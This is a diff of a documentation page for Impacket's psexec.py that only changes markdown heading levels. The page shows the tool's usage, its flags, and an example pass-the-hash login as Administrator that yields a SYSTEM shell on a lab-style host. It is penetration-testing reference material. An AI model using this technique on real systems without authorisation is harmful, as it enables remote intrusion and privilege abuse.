@@ -13,11 +13,11 @@ weight : 0
 
 PSEXEC like functionality example using RemComSvc.
 
-### Installation
+## Installation
 
 Install the [Impacket Framework]({{< ref "../" >}})
 
-### Usage
+## Usage
 
 ```plain
 psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-codec CODEC] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]
@@ -25,7 +25,7 @@ psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-codec CO
                  target [command ...]
 ```
 
-### Flags
+## Flags
 
 ```plain
 Impacket v0.9.25.dev1+20220201.191645.d8679837 - Copyright 2021 SecureAuth Corporation
@@ -67,7 +67,7 @@ connection:
                         This will be the name of the executable uploaded on the target
 ```
 
-### Examples
+## Examples
 
 ```plain
 $ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83 Administrator@10.10.10.16
@@ -87,6 +87,6 @@ C:\Windows\system32>whoami
 nt authority\system
 ```
 
-### URL list
+## URL List
 
 * [Github.com](https://github.com/SecureAuthCorp/impacket)
